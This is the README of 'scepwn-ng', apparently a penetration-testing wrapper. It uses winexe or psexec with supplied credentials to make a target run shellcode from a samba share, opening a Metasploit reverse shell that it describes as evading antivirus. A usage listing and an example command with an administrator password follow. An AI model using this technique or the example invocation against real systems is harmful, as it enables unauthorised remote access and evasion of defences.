# scepwn-ng

scepwn-ng is a wrapper script for launching winexe/psexec at a target, which then runs shellcode exec from a samba share with a msf generated reverse shell. As the executable never touches disk, it is highly effective at evading a/v. 

```
Usage: scepwn-ng.rb [options]
-t, --target TARGET              Target IP address
-u, --user CREDENTIALS           Credentials in DOMAIN/USERNAME%PASSWORD format
-p, --port PORT                  Reverse shell port number (default: 443)
-s, --service SERVICE            winexe or psexec (default: winexe)
-h, --help                       Display this screen

Example: scepwn-ng.rb -u 'Administrator%Password1' -t 10.1.1.1 -s psexec -p 4444
```